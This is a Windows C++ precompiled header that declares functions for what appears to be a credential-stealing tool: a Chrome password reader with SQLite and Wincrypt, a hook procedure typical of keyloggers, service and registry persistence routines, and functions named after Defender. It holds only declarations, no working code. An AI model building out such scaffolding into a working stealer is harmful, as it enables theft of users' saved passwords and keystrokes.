// stdafx.h : include file for standard system include files,
// or project specific include files that are used frequently, but
// are changed infrequently
//

#pragma once
#define _WIN32_WINNT _WIN32_WINNT_WIN7
#include "targetver.h"

#include <stdio.h>
#include <ostream>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <iterator>
#include <vector>
#include <algorithm>

#include <tchar.h>
#include <windows.h>
#include <Wincrypt.h>
#include "chrome-passwords/src/sqlite3.h"

#pragma warning(disable:4996)
#define MY_ENCODING_TYPE  (PKCS_7_ASN_ENCODING | X509_ASN_ENCODING)
#pragma comment(lib, "Crypt32")

void PasswordRun(LPSTR lpCmdLine);
int SampleServiceMain(int argc, TCHAR *argv[]);
LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam);

class My {
public:
	static void Debug(std::string string);
	static std::string GetProcessFileName(DWORD dwProcId);
	static std::string GetWindowFileName(HWND hwnd);
	static bool Test();
	static bool RunProcess(LPSTR lpCmdLine);
	static bool UpdateRegistration(LPSTR lpCmdLine);
	static bool Service(LPSTR lpCmdLine);
	static HWND DefenderCreateWindow(HINSTANCE hInstance);
	static LRESULT DefenderRunCommand();
	static LRESULT DefenderQuit();
};